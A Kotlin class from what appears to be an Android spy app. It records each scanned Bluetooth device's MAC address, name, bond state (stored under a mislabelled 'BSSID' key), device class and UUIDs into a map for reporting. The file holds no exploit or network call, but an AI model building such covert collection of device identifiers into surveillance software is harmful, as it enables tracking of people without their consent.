package com.komnacki.androidspyapp.results

import android.bluetooth.BluetoothClass
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothDevice.*
import android.content.Context
import android.util.Log
import com.komnacki.androidspyapp.Message

class BluetoothScanResult(override var context: Context, var device: BluetoothDevice?) :
    Message {
    init {
        getBluetoothResults(device)
    }

    private lateinit var info: MutableMap<String, Any>

    private fun getBluetoothResults(device: BluetoothDevice?) {
        if (device != null) {
            try {
                info = mutableMapOf()
                info["MAC"] = device.address
                info["NAME"] = if(device.name.isNullOrBlank()) { "Unknown_" + System.currentTimeMillis() } else { device.name }
                info["BSSID"] = when (device.bondState) {
                    BOND_NONE -> "None"
                    BOND_BONDING -> "Bonding"
                    BOND_BONDED -> "Bonded"
                    else -> "Unknown"
                }
                info["DEVICE_TYPE"] = when (device.bluetoothClass.majorDeviceClass) {
                    BluetoothClass.Device.Major.AUDIO_VIDEO -> "AUDIO_VIDEO"
                    BluetoothClass.Device.Major.COMPUTER -> "COMPUTER"
                    BluetoothClass.Device.Major.HEALTH -> "HEALTH"
                    BluetoothClass.Device.Major.IMAGING -> "IMAGING"
                    BluetoothClass.Device.Major.MISC -> "MISC"
                    BluetoothClass.Device.Major.NETWORKING -> "NETWORKING"
                    BluetoothClass.Device.Major.PERIPHERAL -> "PERIPHERAL"
                    BluetoothClass.Device.Major.PHONE -> "PHONE"
                    BluetoothClass.Device.Major.TOY -> "TOY"
                    BluetoothClass.Device.Major.UNCATEGORIZED -> "UNCATEGORIZED"
                    BluetoothClass.Device.Major.WEARABLE -> "WEARABLE"
                    else -> "Unknown"
                }
                info["UUIDS"] = if(device.uuids.isNullOrEmpty()) { "Unknown" } else { device.uuids }
            } catch (e: Exception) {
                Log.e(
                    "KK: ",
                    "EXCEPTION during save fields for bluetooth in BluetoothScanResult: " + e.cause + ", " + e.message
                )
            }
        } else {
            Log.e(
                "KK: ",
                "EXCEPTION during save fields for wifi in BluetoothScanResult: " + "Scan result == null"
            )
        }
    }

    override fun getData(): Map<String, Any> {
        return info
    }

    fun getBluetoothName(): String {
        val name = info["NAME"]
        return if (name != null) {
            val result: String = name as String
            if (!result.isBlank()) {
                result
            } else {
                "Unknown_" + System.currentTimeMillis()
            }
        } else {
            "Unknown_" + System.currentTimeMillis()
        }
    }
}